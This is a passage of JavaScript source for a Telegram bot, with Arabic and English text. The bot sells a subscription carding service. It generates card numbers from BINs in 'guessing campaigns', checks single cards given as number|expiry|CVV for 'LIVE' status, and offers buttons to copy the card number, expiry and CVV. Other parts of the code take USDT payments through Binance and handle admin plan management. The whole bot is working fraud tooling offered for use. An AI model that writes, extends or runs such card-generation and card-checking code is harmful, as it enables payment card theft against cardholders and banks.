                await bot.sendMessage(cid, '⚠️ أنت في الخطة المجانية. قم بترقية خطتك للحصول على عدد أكبر.', { reply_markup:{ inline_keyboard:[[{text:'💎 عرض الاشتراكات',callback_data:'menu_subscribe'}]] } });
            }
            return; // البقاء في نفس الحالة ليدخل رقماً صحيحاً
        }

        if (state.step==='awaiting_count') {
            state.bins.push(state.currentBin);
            delete state.currentBin;
            await bot.sendMessage(cid, `✅ تم إضافة BIN: ${state.bins[state.bins.length-1]}\nالعدد الافتراضي أصبح ${count}.`);
        } else {
            await bot.sendMessage(cid, `✅ تم تعيين العدد الافتراضي للحملات إلى ${count}.`);
        }

        state.defaultCount=count;
        
        const plans=getPlans(), maxC=plans[subscriber.plan].campaignsLimit;
        let btns=[];
        if(state.bins.length>=maxC) btns=[[{text:'🚀 تطوير اشتراكك',callback_data:'menu_subscribe'}],[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:'❌ إلغاء',callback_data:'cancel_guess'}]];
        else btns=[[{text:'➕ إرسال BIN آخر',callback_data:'add_another_bin'}],[{text:'🎯 تغيير العدد الافتراضي',callback_data:'set_default_count'}],[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:'❌ إلغاء',callback_data:'cancel_guess'}]];
        
        await bot.sendMessage(cid, 'ماذا تريد أن تفعل الآن؟', { reply_markup:{ inline_keyboard:btns } });
        state.step='awaiting_decision';
        return;
    }

    // أوامر الأدمن
    if(state && state.step==='admin_edit_price'){
        const parts=text.split('=');
        if(parts.length!==2){ await bot.sendMessage(cid,'صيغة غير صحيحة'); return; }
        const planKey=parts[0].trim().toLowerCase(), newPrice=parseFloat(parts[1]);
        if(isNaN(newPrice)){ await bot.sendMessage(cid,'السعر يجب أن يكون رقماً'); return; }
        const plans=getPlans();
        if(!plans[planKey]){ await bot.sendMessage(cid,`الخطة ${planKey} غير موجودة`); return; }
        plans[planKey].price=newPrice; updatePlans(plans);
        await bot.sendMessage(cid,`✅ تم تحديث سعر خطة ${planKey} إلى ${newPrice} USDT`);
        userStates.delete(cid); await showAdminPanel(cid);
        return;
    }
    if(state && state.step==='admin_edit_speed'){
        const parts=text.split('=');
        if(parts.length!==2){ await bot.sendMessage(cid,'صيغة غير صحيحة'); return; }
        const planKey=parts[0].trim().toLowerCase(), newSpeed=parseInt(parts[1]);
        if(isNaN(newSpeed)||newSpeed<1||newSpeed>100){ await bot.sendMessage(cid,'السرعة بين 1 و 100'); return; }
        const plans=getPlans();
        if(!plans[planKey]){ await bot.sendMessage(cid,`الخطة ${planKey} غير موجودة`); return; }
        plans[planKey].speed=newSpeed; updatePlans(plans);
        await bot.sendMessage(cid,`✅ تم تحديث سرعة خطة ${planKey} إلى ${newSpeed}%`);
        userStates.delete(cid); await showAdminPanel(cid);
        return;
    }
    if(state && state.step==='admin_add_plan'){
        const parts=text.split('|');
        if(parts.length!==6){ await bot.sendMessage(cid,'صيغة غير صحيحة'); return; }
        const [nameAr,nameEn,price,cardsLimit,campaignsLimit,speed]=parts;
        const newPrice=parseFloat(price), newCards=parseInt(cardsLimit), newCamp=parseInt(campaignsLimit), newSpeed=parseInt(speed);
        if(isNaN(newPrice)||isNaN(newCards)||isNaN(newCamp)||isNaN(newSpeed)){ await bot.sendMessage(cid,'جميع القيم يجب أن تكون أرقاماً'); return; }
        const plans=getPlans(); const key=nameEn.toLowerCase();
        plans[key]={nameAr,nameEn,price:newPrice,cardsLimit:newCards,campaignsLimit:newCamp,speed:newSpeed};
        updatePlans(plans);
        await bot.sendMessage(cid,`✅ تم إضافة خطة جديدة: ${nameAr} (${nameEn})`);
        userStates.delete(cid); await showAdminPanel(cid);
        return;
    }
    if(state && state.step==='admin_grant'){
        const parts=text.split(' ');
        if(parts.length!==2){ await bot.sendMessage(cid,'صيغة غير صحيحة. مثال: 123456789 pro'); return; }
        const userId=parseInt(parts[0]), planKey=parts[1].toLowerCase();
        const plans=getPlans();
        if(!plans[planKey]){ await bot.sendMessage(cid,`الخطة ${planKey} غير موجودة`); return; }
        const end=new Date(); end.setMonth(end.getMonth()+1);
        updateSubscriber(userId,{plan:planKey,startDate:new Date().toISOString(),endDate:end.toISOString()});
        await bot.sendMessage(cid,`✅ تم منح اشتراك ${planKey} للمستخدم ${userId}`);
        userStates.delete(cid); await showAdminPanel(cid);
        return;
    }
    if(state && state.step==='admin_remove'){
        const userId=parseInt(text);
        if(isNaN(userId)){ await bot.sendMessage(cid,'معرف غير صالح'); return; }
        updateSubscriber(userId,{plan:'free',startDate:new Date().toISOString(),endDate:new Date(Date.now()+365*24*60*60*1000).toISOString()});
        await bot.sendMessage(cid,`✅ تم إلغاء اشتراك المستخدم ${userId}`);
        userStates.delete(cid); await showAdminPanel(cid);
        return;
    }

    // فحص فيزا واحدة
    if(text.includes('|') && text.split('|').length === 4){
        await bot.sendMessage(cid, dict.single_checking);
        const result=await checkSingleCard(text,cid);
        if(result && result.isLive){
            const flag=getFlag(result.country);
            const cardType=getCardType(text.split('|')[0]);
            const liveText=dict.live_result.replace('{card}',text).replace('{type}',cardType).replace('{country}',result.country).replace('{flag}',flag);
            const btns=getCopyButtons(text,lang);
            await bot.sendMessage(cid, liveText, { parse_mode:'Markdown', ...btns });
        } else {
             await bot.sendMessage(cid, '❌ البطاقة غير صالحة (Dead) أو مجهولة السيرفر.');
        }
        return;
    }
});

// ==========================================
// الترجمات
// ==========================================
const translations = {
    ar: {
        main_menu: '✨ *القائمة الرئيسية* ✨\nاختر أحد الخيارات:',
        btn_guess: '🎲 تخمين مجموعة فيزات',
        btn_single: '🔍 فحص فيزا واحدة',
        btn_subscribe: '💎 الاشتراكات',
        btn_my_campaigns: '📋 حملاتي النشطة',
        cancel_btn: '❌ إلغاء',
        btn_copy_full: '📋 نسخ الفيزا كاملة',
        btn_copy_num: '🔢 نسخ الرقم',
        btn_copy_exp: '📅 نسخ التاريخ',
        btn_copy_cvv: '🔐 نسخ CVV',
        enter_bin: '📌 أرسل الـ BIN الخاص بك (أول 6 أرقام أو أكثر)\nمثال: `62581`\nيمكنك إرسال عدة BINs',
        count_out_of_range: '⚠️ العدد المسموح لخُطتك الحالية هو حتى {max} بطاقة للحملة.',
        cancel_msg: '❌ تم إلغاء العملية والعودة للقائمة الرئيسية.',
        live_result: '✅ تعمل بنجاح ✅\n----------------------------------------\n\n💳    `{card}`\n\n📊 الحالة: تعمل ✅\n\n🏦 النوع: {type}\n\n🌍 البلد: {country} {flag}\n\n----------------------------------------\nبواسطة البوت الخاص بك',
        no_live_found: '😞 انتهى التخمين. لم يتم العثور على أي بطاقة صالحة من أصل {total}.',
        new_campaign_btn: '🚀 بدء حملة جديدة',
        summary: '📊 *الملخص النهائي*\n✅ الصالحة: {hit}\n🎯 المجموع المفحوص: {total}',
        single_invalid: '📌 أرسل الفيزا كاملة بهذا التنسيق:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ جاري فحص البطاقة...',
        api_error: '⚠️ حدث خطأ أثناء الاتصال بالخدمة.',
        not_admin: '⛔ هذا الأمر للأدمن فقط.',
        subscription_plans: '💎 *خطط الاشتراك*\nاختر الخطة التي تناسبك:',
        already_subscribed: '✅ أنت مشترك بالفعل في خطة {plan}.',
        upgrade_to_pro: '🚀 تطوير إلى Pro',
        upgrade_to_vip: '🚀 تطوير إلى VIP',
        upgrade_suggestion: 'يمكنك ترقية اشتراكك الآن:',
        subscribe_confirm: '✅ اخترت خطة {plan}\nقم بتحويل {amount} USDT إلى معرف بايننس:\n`{payId}`\nواكتب هذا الكود في الملاحظات:\n`{code}`\nثم أرسل صورة التحويل هنا.',
        payment_timeout: '⚠️ لم يتم إرسال صورة التحويل.',
        payment_received: '📸 تم استلام الصورة. سيتم مراجعتها قريباً من قبل الإدارة.',
        payment_approved: '🎉 تم تفعيل اشتراك {plan} بنجاح! استمتع بالمميزات.',
        payment_rejected: '❌ تم رفض طلب الاشتراك لعدم صحة الإيصال.',
        campaigns_limit_reached: '⚠️ لقد وصلت للحد الأقصى للحملات المتزامنة ({limit}) لخُطتك.',
        campaign_stopped: '🛑 تم إيقاف الحملة {id}.',
        no_active_campaigns: '⚠️ لا توجد حملات نشطة حالياً.',
        active_campaigns: '📋 *حملاتي النشطة*\n'
    },
    en: {
        main_menu: '✨ *Main Menu* ✨\nChoose an option:',
        btn_guess: '🎲 Guess multiple cards',
        btn_single: '🔍 Check single card',
        btn_subscribe: '💎 Subscriptions',
        btn_my_campaigns: '📋 My active campaigns',
        cancel_btn: '❌ Cancel',
        btn_copy_full: '📋 Copy full card',
        btn_copy_num: '🔢 Copy number',
        btn_copy_exp: '📅 Copy expiry',
        btn_copy_cvv: '🔐 Copy CVV',
        enter_bin: '📌 Send your BIN (first 6 digits or more)\nExample: `62581`\nYou can send multiple BINs',
        count_out_of_range: '⚠️ Allowed count for your plan is up to {max}.',
        cancel_msg: '❌ Operation cancelled.',
        live_result: '✅ LIVE ✅\n----------------------------------------\n\n💳    `{card}`\n\n📊 Status: LIVE ✅\n\n🏦 Type: {type}\n\n🌍 Country: {country} {flag}\n\n----------------------------------------\nBy Your Bot',
        no_live_found: '😞 Finished. No live cards found out of {total}.',
        new_campaign_btn: '🚀 Start new campaign',
        summary: '📊 *Final Summary*\n✅ Live: {hit}\n🎯 Total Checked: {total}',
        single_invalid: '📌 Send the full card in this format:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ Checking card...',
        api_error: '⚠️ API error. Please try again later.',
        not_admin: '⛔ This command is for admins only.',
        subscription_plans: '💎 *Subscription Plans*\nChoose your plan:',
        already_subscribed: '✅ You are already subscribed to {plan} plan.',
        upgrade_to_pro: '🚀 Upgrade to Pro',
        upgrade_to_vip: '🚀 Upgrade to VIP',
        upgrade_suggestion: 'You can upgrade your subscription now:',
        subscribe_confirm: '✅ You selected {plan} plan\nPlease send {amount} USDT to Binance ID:\n`{payId}`\nAnd write this code in the memo:\n`{code}`\nThen send the payment proof photo here.',
        payment_timeout: '⚠️ No payment proof received.',
        payment_received: '📸 Payment proof received. It will be reviewed soon.',
        payment_approved: '🎉 Your {plan} subscription has been activated!',
        payment_rejected: '❌ Subscription request rejected.',
        campaigns_limit_reached: '⚠️ You have reached the maximum concurrent campaigns ({limit}) for your plan.',
        campaign_stopped: '🛑 Campaign {id} stopped.',
        no_active_campaigns: '⚠️ No active campaigns.',
        active_campaigns: '📋 *Your active campaigns*\n'
    }
};

console.log('✅ البوت يعمل الآن بقوة وثبات تام...');
